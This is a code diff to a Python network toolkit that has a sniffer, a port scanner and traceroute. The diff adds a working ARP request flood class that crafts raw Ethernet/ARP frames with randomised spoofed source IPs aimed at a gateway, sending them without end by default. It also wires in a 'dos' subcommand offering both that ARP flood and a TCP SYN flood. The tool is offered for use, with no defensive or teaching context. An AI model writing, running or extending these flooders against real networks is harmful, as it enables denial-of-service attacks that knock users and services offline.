@@ -4,6 +4,7 @@ import asyncio
 import struct
 import signal
 import ctypes
+import binascii
 import ssl
 import sys
 import os
@@ -18,7 +19,7 @@ class Constant :
     TIME : int = round(time.time())
     ISOS : bool = any([os in sys.platform for os in ("linux", "bsd", "darwin")])
     IFACES : list = [iface[-1] for iface in socket.if_nameindex()]
-    COUNTER : int = ctypes.c_uint32
+    COUNTER : int = ctypes.c_uint64
     SUP_COLOR : bool = True if (os.getenv("COLORTERM") in ("truecolor", "24bit", "color24")) and (os.getenv("NOCOLOR") in (None, 0, "false", "no")) else False
     SLASH : str = chr(47)
     ESCAPE : str = chr(27)
@@ -646,7 +647,7 @@ class Sniff :
             sniff.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, self.iface)
             sniff.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, self.sock_recvbuf)
             while True :
-                raw_data = await self.loop.sock_recvfrom(sniff, 65535)
+                raw_data = await self.loop.sock_recvfrom(sniff, 0xffff)
                 raw_data_memview = memoryview(raw_data[0])
                 if raw_data : await self.add_to_stack(raw_data_memview)
                 await self.outputctl()
@@ -700,7 +701,7 @@ class Scan :
     def ipv4_header(self) -> bytes :
         src = socket.inet_pton(socket.AF_INET, self.source)
         dst = socket.inet_pton(socket.AF_INET, self.host)
-        randidn = random.randint(1024, 65535)
+        randidn = random.randint(1024, 0xffff)
         header = self.ip_header(src = src, dst = dst, idn = randidn)
         checksum_ip_header = self.checksum(header)
         header = self.ip_header(src = src, dst = dst, idn = randidn, csm = checksum_ip_header)
@@ -709,9 +710,9 @@ class Scan :
     def tcpip_header(self, port : int) -> tuple[bytes, int] :
         src = socket.inet_pton(socket.AF_INET, self.source)
         dst = socket.inet_pton(socket.AF_INET, self.host)
-        src_p = random.randint(1024, 65535)
+        src_p = random.randint(1024, 0xffff)
         dst_p = port
-        randseq = random.randint(0, 65535)
+        randseq = random.randint(0, 0xffff)
         header = self.tcp_header(src_p = src_p, dst_p = dst_p, seq = randseq, syn = 1)
         pseudo_header = self.pseudo_header(src = src, dst = dst, pln = len(header))
         checksum_tcp_header = self.checksum(header + pseudo_header)
@@ -887,7 +888,7 @@ class Trace :
 
     def prepare(self, src : str, dst : str, src_p : int, dst_p : int, ttl : int, data : bytes) -> bytes :
         randnum : int = lambda x, y : random.randint(x, y)
-        randidn = randnum(0, 65535)
+        randidn = randnum(0, 0xffff)
         data_length = len(data)
         src = socket.inet_pton(socket.AF_INET, src)
         dst = socket.inet_pton(socket.AF_INET, dst)
@@ -924,7 +925,7 @@ class Trace :
 
     def send(self, src : str, dst : str, ttl : int) -> memoryview :
         key_data = self.key_data
-        rand_src_p, rand_dst_p = random.randint(1024, 65535), self.port
+        rand_src_p, rand_dst_p = random.randint(1024, 0xffff), self.port
         payload = self.prepare(src, dst, rand_src_p, rand_dst_p, ttl = ttl, data = key_data)
         with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP) as trace :
             trace.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
@@ -997,6 +998,157 @@ class Trace :
         return
 
 
+class DoS_Arp :
+    def __init__(self, iface : str, source : str, gateway : str, srcmac : str, number : int, wait : float) -> "DoS_Arp class" :
+        self._iface = self.iface = iface
+        self._source = self.source = source
+        self.gateway = gateway
+        self.srcmac = srcmac
+        self.num = number
+        self.wait = wait
+        self._count = Constant.COUNTER(0)
+        self.dstmac = "ff:ff:ff:ff:ff:ff"
+        self.hattype = 1
+
+    def __repr__(self) -> str :
+        items = "\n\t".join([f"{k} : {v}" for k, v in self.__dict__.items()])
+        return f"{self.__class__}\n\t{items}"
+
+    def __str__(self) -> str :
+        return f"DoS_Arp : \n\t{self.iface}\n\t{self.srcmac}\n\t{self.source}"
+
+    @property
+    def iface(self) -> str :
+        return self._iface
+
+    @iface.setter
+    def iface(self, value : str) -> None :
+        ifaces = Constant.IFACES
+        if (self._iface not in ifaces) :
+            raise OSError(f"{self.iface} not in {ifaces}")
+        else : self._iface = value
+        return
+
+    @property
+    def source(self) -> str :
+        randnum = lambda : random.randint(0, 255)
+        ip = ".".join([str(randnum()) if (part == "*") else part for part in self._source.split(".")])
+        return ip
+
+    @source.setter
+    def source(self, value : str) -> None :
+        self._source = value
+        return
+
+    @property
+    def srcmac(self) -> bytes :
+        return self._srcmac
+
+    @srcmac.setter
+    def srcmac(self, value : str) -> None :
+        self._srcmac = binascii.unhexlify(value.replace(":", ""))
+        return
+
+    @property
+    def dstmac(self) -> bytes :
+        return self._dstmac
+
+    @dstmac.setter
+    def dstmac(self, value : str) -> None :
+        self._dstmac = binascii.unhexlify(value.replace(":", ""))
+        return
+
+    @property
+    def count(self) -> int :
+        return self._count.value
+
+    @count.setter
+    def count(self, value : int) -> None :
+        if (self._count.value > 0xffff) and (self.num == -1) :
+            self._count.value = 0
+            self._count.value = value - 0xffff
+        else : self._count.value = value
+        return
+
+    @staticmethod
+    def ethernet_header(dst : str, src : str, typ : int) -> bytes :
+        return struct.pack("!6s6sH", dst, src, typ)
+
+    @staticmethod
+    def arp_header(htp : int, ptp : int, hln : int, pln : int, opt : int, sha : str, spa : str, tha : str, tpa : str) -> bytes :
+        spa = socket.inet_pton(socket.AF_INET, spa)
+        tpa = socket.inet_pton(socket.AF_INET, tpa)
+        return struct.pack("!HHBBH6s4s6s4s", htp, ptp, hln, pln, opt, sha, spa, tha, tpa)
+
+    @staticmethod
+    def progress_bar(load_bar : str, x : int, y : int, /) -> None :
+        text = "[" + Constant.GREEN("+") + "]" + " " + f"{load_bar(x, y)}" + " " + f"[{x}/{y}]"
+        print(text, end = "\r", flush = True)
+        return
+
+    @staticmethod
+    def load_bar(x : int, y : int, /) -> str :
+        symbol = Constant.SLASH
+        if (y < 32) : return 32 * symbol if (x == y) else 0 * symbol
+        sec = y // 32
+        now = x // sec
+        return now * symbol
+
+    def check_eth_p_all(self) -> None :
+        if ("ETH_P_ALL" not in socket.__all__) :
+            socket.ETH_P_ALL = 3
+        return
+
+    def prepare(self) -> bytes :
+        eth = self.ethernet_header(
+            dst = self.dstmac,
+            src = self.srcmac,
+            typ = 0x0806
+            )
+        arp = self.arp_header(
+            htp = self.hattype,
+            ptp = 0x0800,
+            hln = 6,
+            pln = 4,
+            opt = 1,
+            sha = self.srcmac,
+            spa = self.source,
+            tha = self.dstmac,
+            tpa = self.gateway
+            )
+        return eth + arp
+
+    def flood(self) -> None :
+        self.check_eth_p_all()
+        self.__flood()
+        return
+
+    def __flood(self) -> None :
+        addr = (
+            self.iface,
+            socket.ETH_P_ALL,
+            socket.PACKET_HOST,
+            self.hattype,
+            self.dstmac
+            )
+        print("preparing AF_PACKET socket... ", end = str(), flush = True)
+        with socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(socket.ETH_P_ALL)) as flood :
+            flood.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 0)
+            print(Constant.GREEN("DONE"))
+            print("flooding started...")
+            while (self.count != self.num) :
+                payload = self.prepare()
+                flood.sendto(payload, addr)
+                self.count += 1
+                if (self.num != -1) : self.progress_bar(self.load_bar, self.count, self.num)
+                time.sleep(self.wait)
+            else :
+                end_time = round((time.time() - Constant.TIME), 2)
+                print("\n[" + Constant.GREEN("+") + "]" + " " + "ARP Requests datagrams have been sent")
+                print("[" + Constant.GREEN("+") + "]" + " " + f"{end_time}s")
+        return
+
+
 class DoS_SYN :
     def __init__(self, host : str, port : int, count : int, rand_port : bool) -> "DoS_SYN_class" :
         self.host = host
@@ -1015,7 +1167,7 @@ class DoS_SYN :
 
     @property
     def port(self) -> int :
-        return self._port if not self.rand_port else random.randint(0, 65535)
+        return self._port if not self.rand_port else random.randint(0, 0xffff)
 
     @port.setter
     def port(self, value : int) -> None :
@@ -1049,7 +1201,7 @@ class DoS_SYN :
         oft : int = 5, urg : int = 0,
         ack : int = 0, psh : int = 0,
         rst : int = 0, syn : int = 0,
-        fin : int = 0, win : int = 65535,
+        fin : int = 0, win : int = 0xffff,
         csm : int = 0, urp : int = 0) -> bytes :
         oft <<= 12
         res = 0 << 6
@@ -1071,8 +1223,8 @@ class DoS_SYN :
         for i in range(0, len(data), 2) :
             word = (data[i] << 8) + data[i + 1]
             checksum += word
-        checksum = (checksum >> 16) + (checksum & 65535)
-        checksum = (~ checksum) & 65535
+        checksum = (checksum >> 16) + (checksum & 0xffff)
+        checksum = (~ checksum) & 0xffff
         return checksum
 
     @staticmethod
@@ -1081,7 +1233,7 @@ class DoS_SYN :
         return ".".join(secs)
 
     @staticmethod
-    def progress_bar(x : int, y : int) -> str :
+    def progress_bar(x : int, y : int, /) -> str :
         symbol = Constant.SLASH
         if (y < 32) : return 32 * symbol if (x == y) else 0 * symbol
         sec = y // 32
@@ -1093,12 +1245,12 @@ class DoS_SYN :
         randnum = lambda x, y : random.randint(x, y)
         src = socket.inet_pton(socket.AF_INET, self.source)
         dst = socket.inet_pton(socket.AF_INET, self.host)
-        randidn = randnum(0, 65535)
+        randidn = randnum(0, 0xffff)
         ip_header = self.ip_header(src = src, dst = dst, idn = randidn)
         checksum = self.checksum(ip_header)
         ip_header = self.ip_header(src = src, dst = dst, idn = randidn, csm = checksum)
-        randseq = randnum(0, 65535)
-        randsrp = randnum(1024, 65535)
+        randseq = randnum(0, 0xffff)
+        randsrp = randnum(1024, 0xffff) 
         port = self.port
         tcp_header = self.tcp_header(src_p = randsrp, dst_p = port, seq = randseq, syn = 1)
         pseudo_header = self.pseudo_header(src = src, dst = dst, pln = len(tcp_header))
@@ -1125,7 +1277,7 @@ class DoS_SYN :
             print(text, end = "\r", flush = True)
         else :
             end_time = round((time.time() - Constant.TIME), 2)
-            print("\n[" + Constant.GREEN("+") + "]" + " " + "all SYN segments have sent")
+            print("\n[" + Constant.GREEN("+") + "]" + " " + "all SYN segments have been sent")
             print("[" + Constant.GREEN("+") + "]" + " " + f"{end_time}s")
         return
 
@@ -1382,30 +1534,40 @@ if not Constant.MODULE :
         info_tool = subparser.add_parser("info", help = "print informations about os, system etc.")
         info_tool.add_argument("-m", "--msg", type = str, help = "appends message to info", default = "HI6ToolKit")
         info_tool.set_defaults(func = info_args)
-        sniff_tool = subparser.add_parser("sniff", help = "execute packet sniffer")
+        sniff_tool = subparser.add_parser("sniff", help = "executes packet sniffer")
         sniff_tool.add_argument("-if", "--iface", type = str, required = True, help = "sniffs on specific interface", metavar = Constant.IFACES)
         sniff_tool.add_argument("-s", "--saddr", type = str, help = "process IPv4 header with specified saddr")
         sniff_tool.add_argument("-d", "--daddr", type = str, help = "process IPv4 header with specified daddr")
         sniff_tool.add_argument("-t", "--tmp", action = "store_true", help = "enables storing sniffed packets in file", default = False)
         sniff_tool.add_argument("-b", "--buffer", type = int,  help = "sets socket.SO_RCVBUF size", metavar = "socket.SO_RCVBUF", default = 128 * 1024)
         sniff_tool.set_defaults(func = Sniff_args)
-        scan_tool = subparser.add_parser("scan", help = "execute SYN port scanner")
+        scan_tool = subparser.add_parser("scan", help = "executes SYN port scanner")
         scan_tool.add_argument("-x", "--host", type = str, required = True, help = "sets host addr for scanning")
         scan_tool.add_argument("-p", "--port_range", type = str, help = "sets range of ports for scanning with format X-Y", metavar = "X-Y", default = "0-65535")
         scan_tool.add_argument("-t", "--timeout", type = float, help = "sets timeout for unanswered syn segments", default = 5.0)
         scan_tool.set_defaults(func = Scan_args)
-        trace_tool = subparser.add_parser("trace", help = "execute traceroute")
+        trace_tool = subparser.add_parser("trace", help = "executes traceroute")
         trace_tool.add_argument("-x", "--host", type = str, required = True, help = "sets hsot addr for tracing")
         trace_tool.add_argument("-e", "--efforts", type = int, help = "sets number of efforts for each hop", default = 3)
         trace_tool.add_argument("-t", "--timeout", type = float, help = "sets timeout for unanswered udp segments", default = 1.0)
         trace_tool.add_argument("-m", "--max-error", type = int, help = "sets maximum number of unanswered udp segments", default = 10)
         trace_tool.set_defaults(func = Trace_args)
-        dos_tool = subparser.add_parser("dos", help = "execute SYN flood DoS")
-        dos_tool.add_argument("-x", "--host", type = str, required = True, help = "sets host for flooding")
-        dos_tool.add_argument("-p", "--port", type = int, help = "sets port for flooding", default = 80)
-        dos_tool.add_argument("-c", "--count", type = int, required = True, help = "sets number of packets")
-        dos_tool.add_argument("-r", "--random-port", action = "store_true", help = "enables random ports")
-        dos_tool.set_defaults(func = DoS_SYN_args)
+        dos_tool = subparser.add_parser("dos", help = "executes DoS attacks")
+        dos_subparser = dos_tool.add_subparsers()
+        arp_tool = dos_subparser.add_parser("arp", help = "executes ARP Request flood")
+        arp_tool.add_argument("-if", "--iface", type = str, required = True, help = "specifies network interface", metavar = Constant.IFACES)
+        arp_tool.add_argument("-g", "--gateway", type = str, required = True, help = "gateway ip address to flood")
+        arp_tool.add_argument("-s", "--source", type = str, required = True, help = "ip can be specific like 192.168.1.1 or can be range like 192.168.*.*") 
+        arp_tool.add_argument("-sm", "--src-mac", type = str, required = True, help = "source MAC address of desired iface")
+        arp_tool.add_argument("-n", "--number", type = int, help = "sets number of datagrams and must be 32 bit", default = -1)
+        arp_tool.add_argument("-w", "--wait", type = float, help = "sets time.sleep after each datagram", default = 0.0)
+        arp_tool.set_defaults(func = DoS_Arp_args)
+        syn_tool = dos_subparser.add_parser("syn", help = "executes TCP SYN flood")
+        syn_tool.add_argument("-x", "--host", type = str, required = True, help = "sets host for flooding")
+        syn_tool.add_argument("-p", "--port", type = int, help = "sets port for flooding", default = 80)
+        syn_tool.add_argument("-n", "--number", type = int, required = True, help = "sets number of packets")
+        syn_tool.add_argument("-r", "--random-port", action = "store_true", help = "enables random ports")
+        syn_tool.set_defaults(func = DoS_SYN_args)
         http_tool = subparser.add_parser("http", help = "execute http request")
         http_tool.add_argument("-x", "--host", type = str, required = True, help = "sets host for http request")
         http_tool.add_argument("-p", "--port", type = int, help = "sets port for http request", default = 80)
@@ -1505,6 +1667,21 @@ if not Constant.MODULE :
         trace.trace()
         return
 
+    def DoS_Arp_args(args : argparse.Namespace) -> None :
+        args.msg = "DoS_Arp"
+        if not Constant.ISROOT : root_access_error()
+        trigger(args)
+        flood = DoS_Arp(
+            args.iface,
+            args.source,
+            args.gateway,
+            args.src_mac,
+            args.number,
+            args.wait
+            )
+        flood.flood()
+        return
+
     def DoS_SYN_args(args : argparse.Namespace) -> None :
         args.msg = "DoS_SYN"
         if not Constant.ISROOT : root_access_error()
@@ -1512,7 +1689,7 @@ if not Constant.MODULE :
         flood = DoS_SYN(
             socket.gethostbyname(args.host),
             args.port,
-            args.count,
+            args.number,
             args.random_port
             )
         flood.flood()
